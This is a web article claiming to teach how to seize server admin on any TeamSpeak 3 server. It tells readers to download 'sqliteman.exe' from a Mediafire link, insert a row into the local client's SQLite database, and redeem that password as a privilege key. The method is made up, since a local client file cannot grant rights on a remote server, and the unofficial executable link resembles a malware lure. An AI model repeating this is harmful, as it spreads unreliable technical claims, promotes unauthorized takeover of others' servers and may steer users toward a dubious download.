# How to Hack Server Admin in Any TeamSpeak 3 Server
 
TeamSpeak 3 is a popular voice communication software that allows users to chat with each other in online games, conferences, or other activities. However, some users may want to gain more control over the server settings, permissions, or channels by hacking the server admin account. In this article, we will show you how to do that using a simple method that does not require any downloads or installations.
 
Before we begin, we want to warn you that hacking server admin in any TeamSpeak 3 server is illegal and unethical. You may face serious consequences if you are caught by the server owner or the authorities. This article is for educational purposes only and we do not condone or encourage any illegal or harmful actions.

## Step 1: Find out the server ID
 
The first step is to find out the server ID of the TeamSpeak 3 server that you want to hack. The server ID is a unique number that identifies each server in the TeamSpeak network. You can find it by right-clicking on the server name in the TeamSpeak client and selecting "Copy Server ID". Alternatively, you can use a website like [TSViewer](https://www.tsviewer.com/) to search for the server name and get its ID.
 
## Step 2: Generate a privilege key
 
The next step is to generate a privilege key that will grant you server admin rights on the TeamSpeak 3 server. A privilege key is a code that can be used once to assign a group or role to a user. To generate a privilege key, you need to use a tool called [sqliteman.exe](https://www.mediafire.com/download.php?gh19zkzb6ogi5jf), which is a database manager for SQLite files. You can download it from [here](https://www.mediafire.com/download.php?gh19zkzb6ogi5jf).
 
Once you have downloaded and extracted sqliteman.exe, open it and click on "File" and then "Open Database". Navigate to the folder where your TeamSpeak 3 client is installed and open the file named "ts3client\_win64.sqlite" (or "ts3client\_win32.sqlite" if you have a 32-bit system). This file contains all the information about your TeamSpeak 3 client, including your bookmarks, identities, and history.
 
After opening the database file, click on "Execute SQL" and paste the following query in the text box:

 `insert into tokens (server_id, token_key, token_type, token_id1, token_id2) values (1, "password", 0, 2, 0);` 
This query will create a new entry in the table named "tokens", which stores all the privilege keys that you have generated or used. You need to replace the number 1 with the server ID that you found in step 1, and replace "password" with any password that you want to use as your privilege key. For example, if your server ID is 1234 and you want to use "hackme" as your password, your query should look like this:
 `insert into tokens (server_id, token_key, token_type, token_id1, token_id2) values (1234, "hackme", 0, 2, 0);` 
After editing the query, click on the "play" button to execute it. You should see a message saying "Query executed successfully". This means that you have successfully generated a privilege key for your target server.
 
## Step 3: Use the privilege key
 
The final step is to use the privilege key that you have generated to gain server admin rights on the TeamSpeak 3 server. To do this, open your TeamSpeak 3 client and connect to the server that you want to hack. Then click on "Permissions" and then "Use Privilege Key". Enter the password that you used as your privilege key in step 2 and click on "OK". You should see a message saying "Privilege Key successfully used". This means that you have successfully hacked server admin on the TeamSpeak 3 server.
